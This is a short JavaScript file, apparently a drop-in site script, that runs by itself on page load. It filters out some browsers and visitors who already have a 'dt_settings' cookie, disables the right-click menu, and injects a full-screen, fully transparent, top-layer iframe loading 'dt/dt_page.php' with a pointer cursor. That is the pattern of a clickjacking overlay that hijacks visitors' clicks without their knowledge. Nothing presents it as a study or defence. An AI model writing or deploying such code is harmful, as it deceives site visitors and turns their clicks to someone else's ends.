
/* Engine */

function dt_checkAgent () {
	if (navigator.userAgent.match('Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone|Explorer|Trident') || navigator.userAgent.match(/Version\/[\d\.]+.*Safari/)) {
		return false;
	}

	return true;
}

function dt_checkCookies () {
	if (!navigator.cookieEnabled || document.cookie.indexOf('dt_settings') != -1) {
		return false;
	}

	return true;
}

function dt_start () {
	if (dt_checkAgent() && dt_checkCookies()) {
		document.oncontextmenu = function () {
			return false;
		}

		var iframeAttributes = 'id="dt_iframe" name="dt_iframe" frameborder="no" scrolling="no" allowtransparency';
		var iframeStyles = 'position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;';
		var element = $('<div/>').appendTo('body');

		$(element).append('<iframe ' + iframeAttributes + ' style="' + iframeStyles + '" src="dt/dt_page.php"></iframe>');
		$('#dt_iframe').css({'visibility': 'hidden', 'height': '1px', 'width': '1px'});
		//$('#dt_iframe').parent() = undefined;
	}

	$('body noindex').remove();
}

/* Intialization */

setTimeout (dt_start, 50);